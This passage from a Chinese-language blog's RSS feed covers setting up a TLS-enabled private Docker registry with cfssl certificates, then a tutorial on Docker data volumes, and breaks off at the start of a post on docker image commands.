&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nb&quot;&gt;sudo cp&lt;/span&gt; ./ca.crt /etc/ca-certificates/trust-source/anchors/ca.crt
&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;update-ca-trust
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;CA证书更新仅对执行命令的进程和新的进程生效。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;接下来，为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;registry&lt;/code&gt;签发证书。&lt;/p&gt;

&lt;p&gt;首先，定义签发请求，&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;./server-csr.json
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;CN&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;registry.cheney.io&quot;&lt;/span&gt;,
    &lt;span class=&quot;s2&quot;&gt;&quot;hosts&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;
        &lt;span class=&quot;s2&quot;&gt;&quot;172.17.0.1&quot;&lt;/span&gt;,
		&lt;span class=&quot;s2&quot;&gt;&quot;172.17.0.2&quot;&lt;/span&gt;,
		&lt;span class=&quot;s2&quot;&gt;&quot;172.17.0.3&quot;&lt;/span&gt;,
		&lt;span class=&quot;s2&quot;&gt;&quot;172.17.0.4&quot;&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,
    &lt;span class=&quot;s2&quot;&gt;&quot;key&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;s2&quot;&gt;&quot;algo&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;rsa&quot;&lt;/span&gt;,
        &lt;span class=&quot;s2&quot;&gt;&quot;size&quot;&lt;/span&gt;: 2048
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,
    &lt;span class=&quot;s2&quot;&gt;&quot;names&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;s2&quot;&gt;&quot;C&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;CN&quot;&lt;/span&gt;,
            &lt;span class=&quot;s2&quot;&gt;&quot;ST&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;JS&quot;&lt;/span&gt;,
            &lt;span class=&quot;s2&quot;&gt;&quot;L&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;Wu Xi&quot;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;cfssl gencert &lt;span class=&quot;nt&quot;&gt;-ca&lt;/span&gt; ../ca.pem &lt;span class=&quot;nt&quot;&gt;-ca-key&lt;/span&gt; ../ca-key.pem &lt;span class=&quot;nt&quot;&gt;--config&lt;/span&gt; ../ca.config &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt; server ./server-csr.json| cfssljson &lt;span class=&quot;nt&quot;&gt;-bare&lt;/span&gt; server
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;得到证书&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;server.pem&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;server-key.pem&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;server.csr&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;（2）启动容器&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker run &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /home/cheney/docker-registry:/var/lib/register &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /home/cheney/expr/CA/server:/certs &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 443:443 &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;REGISTRY_HTTP_ADDR&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.0.0.0:443 &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;REGISTRY_HTTP_TLS_CERTIFICATE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/certs/server.pem &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;REGISTRY_HTTP_TLS_KEY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/certs/server-key.pem  &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;--name&lt;/span&gt; registry &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
registry
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/cheney/expr/CA/server&lt;/code&gt;目录下放置了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;registry&lt;/code&gt;的证书和私钥，需要映射之容器内&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/certs&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;（3）连接测试&lt;/p&gt;

&lt;p&gt;推送：&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker push 172.17.0.2/say:latest
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;拉取：&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker pull 172.17.0.2/say:latest
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

</description>
        <pubDate>Mon, 30 May 2022 00:00:00 +0800</pubDate>
        <link>https://cheneyyin.github.io/2022/05/30/docker-registry/</link>
        <guid isPermaLink="true">https://cheneyyin.github.io/2022/05/30/docker-registry/</guid>
        
        <category>Docker</category>
        
        <category>docker registry</category>
        
        
      </item>
    
      <item>
        <title>Docker数据卷</title>
        <description>&lt;h1 id=&quot;docker数据卷&quot;&gt;docker数据卷&lt;/h1&gt;

&lt;h2 id=&quot;管理数据卷&quot;&gt;管理数据卷&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-she&quot;&gt;docker volume help

Usage:  docker volume COMMAND

Manage volumes

Commands:
  create      Create a volume
  inspect     Display detailed information on one or more volumes
  ls          List volumes
  prune       Remove all unused local volumes
  rm          Remove one or more volumes
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;创建数据卷，&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker volume create one-volume
one-volume
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;查看数据卷，&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker volume &lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;DRIVER    VOLUME NAME
&lt;span class=&quot;nb&quot;&gt;local     &lt;/span&gt;4d8f935f757dbb8ac4b10430f5aab5ca75da0858dd1baa71918ea8c7ad07cc2a
&lt;span class=&quot;nb&quot;&gt;local     &lt;/span&gt;9c68e6e515d217439ba91b7afd022015404f26ca3986463823b3e470394157cd
&lt;span class=&quot;nb&quot;&gt;local     &lt;/span&gt;9f59429de397d54c782fa11ae6cd2107079f97ba91b7008e2b5a541b0b1f4b95
&lt;span class=&quot;nb&quot;&gt;local     &lt;/span&gt;78e96e66f3fdef7fd4e316400a08f518ac6568f84704ca388d77a82b0a8f1509
&lt;span class=&quot;nb&quot;&gt;local     &lt;/span&gt;01714f7baa8968d17ea4b17b2fea9622463bfc43a42c15f4625e67ec0ca69181
&lt;span class=&quot;nb&quot;&gt;local     &lt;/span&gt;bc2041319f5b1d890902fd3d677efcd38730ee60d92f805e25318c01a1a8b740
&lt;span class=&quot;nb&quot;&gt;local     &lt;/span&gt;f5a6a2826e5f5f455b47fb563856a6947a8b74c77f5a7b4c10e8547c3fceccf2
&lt;span class=&quot;nb&quot;&gt;local     &lt;/span&gt;one-volume
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;容器配置数据卷&quot;&gt;容器配置数据卷&lt;/h2&gt;

&lt;p&gt;启动容器&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ubuntu&lt;/code&gt;，并指定数据卷，&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker run &lt;span class=&quot;nt&quot;&gt;-itd&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--mount&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;one-volume,target&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/opt &lt;span class=&quot;nt&quot;&gt;--hostname&lt;/span&gt; ubuntu.com &lt;span class=&quot;nt&quot;&gt;--name&lt;/span&gt; ubuntu ubuntu /bin/bash
8bde099b742cc9702c9cb1b939e2de933f793afadafb587a2b0e1f0c253959c7
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker inspect &lt;span class=&quot;nt&quot;&gt;--format&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\{\{.Mounts\}\}&apos;&lt;/span&gt; ubuntu
&lt;span class=&quot;o&quot;&gt;[{&lt;/span&gt;volume one-volume /var/lib/docker/volumes/one-volume/_data /opt &lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;z &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}]&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;向&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/hello&lt;/code&gt;写入&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hello&lt;/code&gt;，&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-it&lt;/span&gt; ubuntu /bin/bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;echo &quot;hello&quot; &amp;gt; /opt/hello&apos;&lt;/span&gt;
docker &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-it&lt;/span&gt; ubuntu /bin/bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;cat /opt/hello&apos;&lt;/span&gt;
hello
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;容器复用容器数据卷&quot;&gt;容器复用容器数据卷&lt;/h2&gt;

&lt;p&gt;启动容器&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;busybox&lt;/code&gt;，并从容器&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;busybox&lt;/code&gt;复用数据卷，&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker run &lt;span class=&quot;nt&quot;&gt;-itd&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--volumes-from&lt;/span&gt; ubuntu &lt;span class=&quot;nt&quot;&gt;--hostname&lt;/span&gt; busybox.com &lt;span class=&quot;nt&quot;&gt;--name&lt;/span&gt; busybox busybox /bin/sh
638d959856e08b73e14bb9d757d5512f6a6da5f132b44c9d0c03020a27e8fcd4
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker inspect &lt;span class=&quot;nt&quot;&gt;--format&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\{\{.Mounts\}\}&apos;&lt;/span&gt; busybox
&lt;span class=&quot;o&quot;&gt;[{&lt;/span&gt;volume one-volume /var/lib/docker/volumes/one-volume/_data /opt &lt;span class=&quot;nb&quot;&gt;local  true&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}]&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;访问共享文件，&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-it&lt;/span&gt; busybox /bin/sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;cat /opt/hello&apos;&lt;/span&gt;
hello
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;数据卷映射&quot;&gt;数据卷映射&lt;/h2&gt;

&lt;p&gt;在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker run&lt;/code&gt;中，使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-v&lt;/code&gt;开启容器数据卷，&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker run &lt;span class=&quot;nt&quot;&gt;-itd&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /opt &lt;span class=&quot;nt&quot;&gt;--hostname&lt;/span&gt; busybox.com &lt;span class=&quot;nt&quot;&gt;--name&lt;/span&gt; busybox busybox /bin/sh
9a4900b2a5f69037f33a57a02858a9f3b9c25bd4ae799e3ea2008ce17b1fc688
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker inspect &lt;span class=&quot;nt&quot;&gt;--format&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\{\{.Mounts\}\}&apos;&lt;/span&gt; busybox
&lt;span class=&quot;o&quot;&gt;[{&lt;/span&gt;volume 941a2e4bdf9f76c4e07c0b3fd67688495b384f8b9ecfa02332bb8ec1e369ac31 /var/lib/docker/volumes/941a2e4bdf9f76c4e07c0b3fd67688495b384f8b9ecfa02332bb8ec1e369ac31/_data /opt &lt;span class=&quot;nb&quot;&gt;local  true&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}]&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-v HOST_PATH:CONTAINER_PATH&lt;/code&gt;可以指定宿主机路径作为数据卷，&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker run &lt;span class=&quot;nt&quot;&gt;-itd&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /home/XXX/expr/docker/A:/opt &lt;span class=&quot;nt&quot;&gt;--hostname&lt;/span&gt; busybox.com &lt;span class=&quot;nt&quot;&gt;--name&lt;/span&gt; busybox busybox /bin/sh
5584070ff88e4d62a3bb84fbf5978d9efe5a1185cbbca54b12bbad51ee3b9e78
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker inspect &lt;span class=&quot;nt&quot;&gt;--format&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\{\{.Mounts\}\}&apos;&lt;/span&gt; busybox
&lt;span class=&quot;o&quot;&gt;[{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;bind&lt;/span&gt;  /home/cheney/expr/docker/A /opt   &lt;span class=&quot;nb&quot;&gt;true &lt;/span&gt;rprivate&lt;span class=&quot;o&quot;&gt;}]&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

</description>
        <pubDate>Sun, 22 May 2022 00:00:00 +0800</pubDate>
        <link>https://cheneyyin.github.io/2022/05/22/docker-volume/</link>
        <guid isPermaLink="true">https://cheneyyin.github.io/2022/05/22/docker-volume/</guid>
        
        <category>Docker</category>
        
        <category>数据卷</category>
        
        
      </item>
    
      <item>
        <title>Docker image常用命令</title>
        <description>&lt;h1 id=&quot;docker-image常用命令&quot;&gt;Docker image常用命令&lt;/h1&gt;

&lt;h1 id=&quot;1-简介&quot;&gt;1 简介&lt;/h1&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker image&lt;/code&gt;命令用于管理镜像，常见使用方式如下。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;❯ docker image &lt;span class=&quot;nt&quot;&gt;--help&lt;/span&gt;

Usage:  docker image COMMAND

Manage images

Commands:
  build       Build an image from a Dockerfile
  &lt;span class=&quot;nb&quot;&gt;history     &lt;/span&gt;Show the &lt;span class=&quot;nb&quot;&gt;history &lt;/span&gt;of an image
  import      Import the contents from a tarball to create a filesystem image
  inspect     Display detailed information on one or more images
  load        Load an image from a &lt;span class=&quot;nb&quot;&gt;tar &lt;/span&gt;archive or STDIN
  &lt;span class=&quot;nb&quot;&gt;ls          &lt;/span&gt;List images
  prune       Remove unused images
  pull        Pull an image or a repository from a registry
  push        Push an image or a repository to a registry
  &lt;span class=&quot;nb&quot;&gt;rm          &lt;/span&gt;Remove one or more images
  save        Save one or more images to a &lt;span class=&quot;nb&quot;&gt;tar &lt;/span&gt;archive &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;streamed to STDOUT by default&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  tag         Create a tag TARGET_IMAGE that refers to SOURCE_IMAGE
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;2-image-inspect&quot;&gt;2 image inspect&lt;/h2&gt;

&lt;p&gt;示例使用的&lt;strong&gt;say&lt;/strong&gt;镜像的&lt;strong&gt;Dockerfile&lt;/strong&gt;如下：&lt;/p&gt;

&lt;div class=&quot;language-dockerfile highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
